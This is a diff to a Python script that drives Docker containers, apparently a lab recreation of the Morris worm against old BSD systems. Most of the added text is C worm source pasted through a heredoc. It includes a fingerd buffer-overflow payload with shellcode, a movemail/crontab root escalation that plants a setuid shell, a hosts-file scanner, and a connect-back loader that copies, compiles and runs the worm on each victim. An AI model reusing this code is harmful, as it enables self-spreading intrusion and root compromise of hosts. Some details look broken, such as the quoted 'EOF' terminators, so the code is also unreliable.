@@ -1,10 +1,11 @@
+import sys
 import pexpect
 import time
 
-def run_exploit():
-    # 1. Attach to node-1 console
-    print("[+] Attaching to node-1...")
-    child = pexpect.spawn('docker attach node-1', encoding='utf-8')
+def run_sendmail():
+    # 1. Attach to target-prime console
+    print("[+] Attaching to target-prime...")
+    child = pexpect.spawn('docker attach target-prime', encoding='utf-8')
     
     # Wait 5 seconds for the container to settle
     time.sleep(5)
@@ -159,8 +160,627 @@ QUIT
     # This might take a moment as node-2 compiles the code
     child.expect('# ', timeout=120)
     
-    print("[***] Sequence Complete. Node-1 has infected Node-2.")
+    print("[***] Sequence Complete. Target-prime has infected Node-1.")
+    child.interact()
+
+def run_fingerd():
+    # 1. Attach to target-prime console
+    print("[+] Attaching to target-prime...")
+    child = pexpect.spawn('docker attach target-prime', encoding='utf-8')
+    
+    # Wait 5 seconds for the container to settle
+    time.sleep(5)
+    
+    # Send an extra Enter to wake up the console and trigger the login prompt
+    child.sendline('\r')
+    print("[+] Sent wake-up Enter.")
+
+    # 2. Login Handling
+    child.expect('login:')
+    child.sendline('root')
+    child.expect('# ')
+    print("[+] Logged in")
+
+    #  "setup_attacker" text
+    payload = """cd /tmp
+
+cat > send_file_over_socket_bsd.c << 'EOF'
+#include "worm_bsd.h"
+
+#define NUM_CLIENTS 5
+#define SERVER_PORT 4444
+#define IO_BUF_SIZE 2048
+#define FILE_BUF_SIZE 256
+
+int main(argc, argv)
+	int argc; 
+	char *argv[]; 
+{
+	int i, n, num_files;
+
+	char **file_names; 
+	struct file_object *files; 
+	char file_buf[FILE_BUF_SIZE];
+
+	fd_set read_fd; 	
+    int server_fd, max_fd, accept_code, sd;
+	int client_sock[NUM_CLIENTS];
+	char io_buf[IO_BUF_SIZE];
+
+	char *success = "Files recieved";
+
+    struct sockaddr_in address;
+    int addrlen = sizeof(address);
+
+	if (argc < 2) {
+		printf("No files to transfer\n");
+		return 1;
+	}	
+
+	num_files = argc - 1;
+	file_names = argv + 1;
+	files = (struct file_object *)malloc(num_files * sizeof(struct file_object));
+	if (load_files(file_names, num_files, files) < 0) return 1;
+
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY; 
+    address.sin_port = htons(SERVER_PORT);       
+
+    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
+
+    listen(server_fd, NUM_CLIENTS + 1);
+	printf("Listening for connections at port %d\n", SERVER_PORT);
+
+	for (i = 0; i < NUM_CLIENTS; i++) {
+        client_sock[i] = -1;
+    }
+
+	while (1) {
+		FD_ZERO(&read_fd);
+		FD_SET(server_fd, &read_fd);
+
+		max_fd = server_fd;
+
+		for (i = 0; i < NUM_CLIENTS; i++) {
+			if (client_sock[i] > 0) {
+				FD_SET(client_sock[i], &read_fd);	
+				if (client_sock[i] > server_fd) max_fd = client_sock[i];
+			}	
+		}	
+
+		/* block until there is activity */
+		if (select(max_fd + 1, &read_fd, NULL, NULL, NULL) < 0) continue;
+
+		/* accept oncoming connections  */
+		if (FD_ISSET(server_fd, &read_fd)) {
+			accept_code = accept(server_fd, (struct sockaddr *)&address, &addrlen);
+			if (accept_code < 0) continue;
+
+			for (i = 0; i < NUM_CLIENTS; i++) {
+				if (client_sock[i] == -1) { 
+					printf("New connection received! FD: %d\n", accept_code);
+					client_sock[i] = accept_code;
+					break;
+				}	
+			}	
+		}	
+
+		/* communicating with the client sockets  */
+		for (i = 0; i < NUM_CLIENTS; i++) {
+			sd = client_sock[i];
+			if (sd > 0 && FD_ISSET(sd, &read_fd)) {
+				n = read(sd, io_buf, IO_BUF_SIZE - 1);
+
+				if (n == 0) {
+					printf("Client disconnected\n");
+					close(sd);
+					client_sock[i] = -1;
+				} else {	
+					io_buf[n] = '\0';
+					printf("Recieved from %d: %s", sd, io_buf);
+					/* no need to send over ifles when client says it recieved the files */
+					if (strncmp(success, io_buf, strlen(success)) == 0) continue;
+
+					if (send_files(sd, files, num_files, file_buf, FILE_BUF_SIZE) < 0)
+						printf("Failed to send all files\n");
+				}	
+			}	
+		}	
+	}	
+
+	close(server_fd);
+	free(files);
+	
+	return 0;	
+}	
+
+'EOF'
+
+cat > worm_bsd.h << 'EOF'
+#ifndef WORM_BSD_H_
+#define WORM_BSD_H_
+#include <sys/types.h>
+#include <sys/socket.h> 
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <stdio.h>
+
+#define FINGERD_PORT 79
+
+#define BUF_SIZE 532
+#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
+#define PAYLOAD_LEN 28
+#define NOP 0x01
+
+#define PATIENCE 3
+#define IO_BUF_SIZE 2048
+
+#define MOVEMAIL_EXPLOIT "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n"
+#define CRONTAB_EXPLOIT "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n"
+#define CHECK_FOR_SHELL "ls /tmp/sh\n" 
+#define RUN_SHELL "/tmp/sh\n" 
+#define NOT_FOUND "/tmp/sh not found"
+
+struct file_object {
+	char *file_name;
+	FILE *file_ptr;
+	int file_size;
+};	
+
+long int get_file_size(file_ptr)
+	FILE *file_ptr; 
+{
+	long int res;
+    /* checking if the file exist or not */
+    if (file_ptr == NULL) {
+        printf("File Not Found!\n");
+        return -1;
+    }
+
+	/* seek until the end of file */
+    fseek(file_ptr, 0L, 2);
+
+    /* calculating the size of the file */
+    res = ftell(file_ptr);
+
+	rewind(file_ptr);
+
+    return res;
+}
+
+create_sockaddr(serv_addr, ip, port)
+	struct sockaddr_in *serv_addr; 
+	char *ip; 
+	int port;
+{
+	serv_addr->sin_family = AF_INET; 		
+	serv_addr->sin_port = htons(port);
+	serv_addr->sin_addr.s_addr = inet_addr(ip);
+}	
+
+create_exploit(buf, shellcode, buf_size, shellcode_len)
+    char *buf;
+    char *shellcode;
+    int buf_size;
+    int shellcode_len;
+{
+    int i;
+	int j;
+
+    /* Fill with NOPs */
+    for (i = 0; i < buf_size; i++) buf[i] = NOP;
+    
+    /* Insert shellcode at offset 300 */
+    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j];
+
+	for (i = buf_size - 4*4 - 4; i < buf_size - 4; i ++) { 
+		buf[i] = 0x00; 
+	}
+
+    /* Overwrite the return address area (approx 0x7ffeea38) */
+    for (i = buf_size - 4; i < buf_size; i += 4) {
+        buf[i]   = 0x38; 
+        buf[i+1] = 0xea;
+        buf[i+2] = 0xff;
+        buf[i+3] = 0x7f;
+    }
+}
+
+read_from_sock(sock, io_buf, buf_size)
+    int sock;
+    char *io_buf;
+    int buf_size;
+{
+    int num_tries;
+    int n;
+    int readfds;
+    struct timeval tv;
+
+	num_tries = 0;
+
+    while (num_tries < PATIENCE) {
+        readfds = (1 << sock); /* Manual bitmask for old BSD select */
+        tv.tv_sec = 1;
+        tv.tv_usec = 0;
+
+        if (select(sock + 1, &readfds, (int *)0, (int *)0, &tv) > 0) {
+            n = read(sock, io_buf, buf_size - 1);
+            if (n > 0) {
+                io_buf[n] = '\0';
+                printf("%s", io_buf);
+                fflush(stdout);
+                num_tries = 0;
+            } else break;
+        } else num_tries++;
+    }
+}
+
+write_to_sock(sock, text)
+    int sock;
+    char *text;
+{
+    int len;
+	
+	len = strlen(text);
+    write(sock, text, len);
+}
+
+get_root_shell_via_movemail_exploit(sock, io_buf, buf_size)
+	int sock; 
+	char *io_buf; 
+	size_t buf_size; 
+{
+	write_to_sock(sock, MOVEMAIL_EXPLOIT);
+	write_to_sock(sock, CRONTAB_EXPLOIT);
+
+	do {
+		write_to_sock(sock, CHECK_FOR_SHELL);
+		read_from_sock(sock, io_buf, buf_size);
+		
+		sleep(10);
+	} while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));
+
+	write_to_sock(sock, RUN_SHELL);
+}	
+
+int send_int(num, fd)
+	int num; 
+	int fd; 
+{
+    unsigned long conv = htonl((unsigned long)num);
+    char *data = (char*)&conv;
+    int left = sizeof(conv);
+    int rc;
+    do {
+        rc = write(fd, data, left);
+        if (rc < 0) {
+			return -1;
+        }
+        else {
+            data += rc;
+            left -= rc;
+        }
+    }
+    while (left > 0);
+    return 0;
+}
+
+int receive_int(num, fd)
+	int *num; 
+	int fd;
+{
+    unsigned long ret;
+    char *data = (char*)&ret;
+    int left = sizeof(ret);
+    int rc;
+    do {
+        rc = read(fd, data, left);
+        if (rc <= 0) { /* instead of ret */
+			return -1;
+        }
+        else {
+            data += rc;
+            left -= rc;
+        }
+    }
+    while (left > 0);
+    *num = ntohl(ret);
+    return 0;
+}
+
+int load_files(file_paths, num_files, files)
+	char **file_paths;
+	int num_files;
+	struct file_object* files; 
+{
+	int i;  
+	for (i = 0; i < num_files; i++) {
+		files[i].file_name = file_paths[i]; 
+		files[i].file_ptr = fopen(file_paths[i], "r");
+		if (files[i].file_ptr == NULL) return -1;
+		files[i].file_size = get_file_size(files[i].file_ptr);
+	}	
+	return 0;
+}	
+
+int send_files(client_sock, files, num_files, file_buf, buf_size)
+	int client_sock; 
+	struct file_object *files; 
+	int num_files;
+	char *file_buf;
+	int buf_size;
+{ 
+	int i, j;
+	int len;
+	int file_size;
+	/* int response; */
+	char *file_name;
+
+	/* communicate number of files to send */
+	if (send_int(num_files, client_sock) < 0) return -1;
+	
+	/* ensure that the client socket knows how many files to recieve
+	if (receive_int(&response, client_sock) < 0) return -1;
+	if (response != num_files) return -1;
+	printf("Client expecting %d files\n", response);  */
+	
+	/* try to send the files */
+	for (i = 0; i < num_files; i++) {	
+		/* first send the length of the file name */
+		file_name = files[i].file_name;
+		len = strlen(file_name);
+		if (send_int(len, client_sock)) return -1;
+
+		/* actually send the file name  */
+		send(client_sock, file_name, len, 0);
+		
+		/* send the file and rewind file pointer */
+		file_size = files[i].file_size;
+		printf("%s\n %d\n", file_name, file_size);
+		if (file_size < 0) return -1;
+		if (send_int(file_size, client_sock) < 0) return -1; 	
+		while (fgets(file_buf, buf_size, files[i].file_ptr) != NULL) {
+			send(client_sock, file_buf, strlen(file_buf), 0);
+		}	
+		rewind(files[i].file_ptr);
+
+		/* wait until the client says it recieved the file */
+		if (receive_int(&j, client_sock) < 0) return -1;
+		if (i != j) return -1;
+	}	
+
+	return 0;
+}
+#endif
+
+'EOF'
+
+cat > worm_bsd.c << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <netdb.h>
+#include "worm_bsd.h"
+
+#define HOSTS_FILE "/etc/hosts"
+#define MAX_IP_LEN 64
+#define DOCKER_IP_FILE "/etc/docker_ip"
+
+void deploy_receive_file(sock)
+    int sock;
+{
+    char cmd_buf[IO_BUF_SIZE];
+    char *formatted_source;
+    char *file_contents;
+    char local_ip[64];
+    FILE *fp;
+    char line[128];
+    
+    printf("[*] Deploying receive_file.c to target\n");
+
+    strcpy(local_ip, "127.0.0.1"); /* Default fallback */
+    fp = fopen("/etc/docker_ip", "r");
+    if (fp != (FILE *)0) {
+        if (fgets(line, 128, fp) != (char *)0) {
+            sscanf(line, "%s", local_ip);
+        }
+        fclose(fp);
+    }
+    /* printf("[DEBUG] Injected IP will be: [%s]\n", local_ip); */
+
+    formatted_source = (char *)malloc(10000); 
+    if (formatted_source == (char *)0) return;
+
+    file_contents = "#include <stdio.h>\n#include <sys/types.h>\n\
+#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n\
+#define SERVER_IP \"%s\"\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\
+int send_int(n,f) int n; int f; {unsigned long c=htonl((unsigned long)n);char *d=(char*)&c;\
+int l=sizeof(c);int r;do{r=write(f,d,l);if(r<0)return -1;else{d+=r;l-=r;}}\
+while(l>0);return 0;} int receive_int(n,f) int *n; int f; {unsigned long r;char *d=(char*)&r;\
+int l=sizeof(r);int rc;do{rc=read(f,d,l);if(rc<=0)return -1;else{d+=rc;l-=rc;}}\
+while(l>0);*n=ntohl(r);return 0;} int main(){int i,j,n,s,fs,len,nf;\
+struct timeval tv;struct sockaddr_in sa;char b[2048],p[256];FILE *o;char *fn;\
+s=socket(2,1,0);if(s<0)return 1;bzero((char*)&sa,sizeof(sa));sa.sin_family=2;\
+sa.sin_port=htons(4444);sa.sin_addr.s_addr=inet_addr(SERVER_IP);\
+while(connect(s,(struct sockaddr*)&sa,sizeof(sa))<0)sleep(1);\
+while(1){write(s,\"Hello\\n\",6);if(receive_int(&nf,s)<0)break;\
+for(i=0;i<nf;i++){receive_int(&len,s);fn=(char*)malloc(len+1);\
+read(s,fn,len);fn[len]=0;sprintf(p,\"/tmp/%%s\",fn);o=fopen(p,\"w\");\
+receive_int(&fs,s);while(fs>0){n=read(s,b,2047);if(n<=0)break;b[n]=0;\
+fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";
+
+    /* strcpy(my_ip, "172.20.0.11"); */
+    sprintf(formatted_source, file_contents, local_ip);
+
+    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
+    write_to_sock(sock, formatted_source);
+    write_to_sock(sock, "\nEOF\n");
+    sleep(5);
+
+    bzero(cmd_buf, IO_BUF_SIZE);
+    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
+    free(formatted_source);
+}
+
+void infect(ip)
+    char *ip;
+{
+    int sock;
+    struct sockaddr_in serv_addr;
+    char buf[BUF_SIZE];
+    char io_buf[IO_BUF_SIZE];
+    char *argv[5];
+
+    bzero(buf, BUF_SIZE);
+    bzero(io_buf, IO_BUF_SIZE);
+
+    printf("[*] Starting infection for: %s\n", ip);
+    fflush(stdout);
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return;
+
+    create_sockaddr(&serv_addr, ip, FINGERD_PORT);
+
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        close(sock);
+        printf("[*] SOCKET FAILED. EXITING\n");
+        return;
+    }
+
+    create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);
+    write(sock, buf, BUF_SIZE);
+    sleep(5);
+
+    write_to_sock(sock, "echo bang\n");
+
+    get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
+    printf("[*] Root shell obtained\n");
+
+    deploy_receive_file(sock);
+    
+    printf("[*] Forking to create send_file process on server\n");
+
+    if (fork() == 0) {
+        argv[0] = "send_file_over_socket_bsd";
+        argv[1] = "send_file_over_socket_bsd.c"; 
+        argv[2] = "worm_bsd.c";
+        argv[3] = "worm_bsd.h";
+        argv[4] = (char *)0;
+        execv("./send_file_over_socket_bsd", argv);
+        exit(1);
+    }
+
+    printf("[*] Compiling receive_file.c on target\n");
+    write_to_sock(sock, "cd /tmp; cc receive_file.c -o receive_file\n");
+    sleep(2);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
+
+    printf("[*] Running receive_file on target\n");
+    write_to_sock(sock, "/tmp/receive_file &\n");
+    sleep(12);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
+
+    printf("[*] Checking /tmp contents on target\n");
+    write_to_sock(sock, "ls -l /tmp\n");
+    sleep(2);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
+
+    printf("[*] Compiling send_file_over_socket_bsd.c on target\n");
+    write_to_sock(sock, "cd /tmp; cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd\n");
+    sleep(2);
+
+    printf("[*] Compiling worm_bsd.c on target\n");
+    write_to_sock(sock, "cd /tmp; rm -f worm_bsd; cc worm_bsd.c -o worm_bsd\n");
+    sleep(2);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
+    
+    printf("[*] Running worm_bsd on target\n");
+    write_to_sock(sock, "/tmp/worm_bsd &\n");
+    sleep(2);
+    read_from_sock(sock, io_buf, IO_BUF_SIZE);
+
+    close(sock);
+}
+
+int main()
+{
+    FILE *fp;
+    char line[128];
+    char ip[MAX_IP_LEN];
+    char my_ip[MAX_IP_LEN];
+
+    strcpy(my_ip, "127.0.0.1");
+    fp = fopen("/etc/docker_ip", "r");
+    if (fp != (FILE *)0) {
+        if (fgets(line, 128, fp) != (char *)0) {
+            sscanf(line, "%s", my_ip);
+        }
+        fclose(fp);
+    }
+    printf("[*] Attacker IP is %s. Scanning for targets.\n", my_ip);
+
+    while (1) {
+        fp = fopen(HOSTS_FILE, "r");
+        if (fp == (FILE *)0) {
+            sleep(25);
+            continue;
+        }
+
+        while (fgets(line, 128, fp) != (char *)0) {
+            char current_hostname[64];
+
+            if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || line[0] == '\t') {
+                continue;
+            }
+
+            if (sscanf(line, "%s %s", ip, current_hostname) != 2) {
+                continue;
+            }
+
+            if (strcmp(ip, my_ip) == 0) {
+                continue;
+            }
+
+            /* Check if the first 4 characters of the hostname are "node" */
+            if (strncmp(current_hostname, "node", 4) == 0) {
+                
+                /* SUCCESS: 'ip' now holds the address of a node. */
+                 printf("[*] IP for %s found: %s\n", current_hostname, ip);
+            }
+        }
+
+        infect(ip);
+        printf(" ---- Infection Complete for IP: %s ----\n", ip);
+        sleep(10);
+        
+        fclose(fp);
+    }
+}
+
+'EOF'
+
+cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd
+cc worm_bsd.c -o worm_bsd
+
+"""
+
+    # 5. Send the setup_attacker block
+    print("[+] Adding fingerd worm files")
+    child.sendline(payload)
+    
+    # 6. Wait for the shell to return
+    print("[+] Files sent. Starting worm")
+    child.sendline('./worm_bsd')
+    
+    print("[***] Sequence Complete. Worm started on target-prime")
     child.interact()
 
 if __name__ == "__main__":
-    run_exploit()
+    if "-fingerd" in sys.argv:
+        run_fingerd()
+    elif "-sendmail" in sys.argv:
+        run_sendmail()
